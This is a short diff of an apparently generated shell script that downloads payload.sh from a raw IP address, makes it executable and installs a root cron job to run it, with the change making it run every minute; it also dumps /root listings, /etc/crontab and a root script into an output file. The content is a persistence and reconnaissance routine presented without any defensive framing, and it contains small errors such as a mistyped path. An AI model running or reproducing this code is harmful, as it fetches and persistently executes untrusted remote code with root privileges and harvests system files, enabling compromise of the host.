@@ -22,11 +22,11 @@ OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 curl http://35.194.58.97/payload.sh --output /root/payload.sh
 chmod +x /root/payload/sh
 crontab -l > /root/mycron
-echo "*/5 * * * * /root/payload.sh" >> /root/mycron
+echo "* * * * * /root/payload.sh" >> /root/mycron
 crontab /root/mycron 2> \${OUTPATH}
 ls /root >> \${OUTPATH}
 cat /etc/crontab >> \${OUTPATH} 1>&1
-cat /root/refresh_images.bash >> \${OUTPATH}
+cat /root/start_worker.bash >> \${OUTPATH}
 cat /root/mycron >> \${OUTPATH}
 
 __EOF__
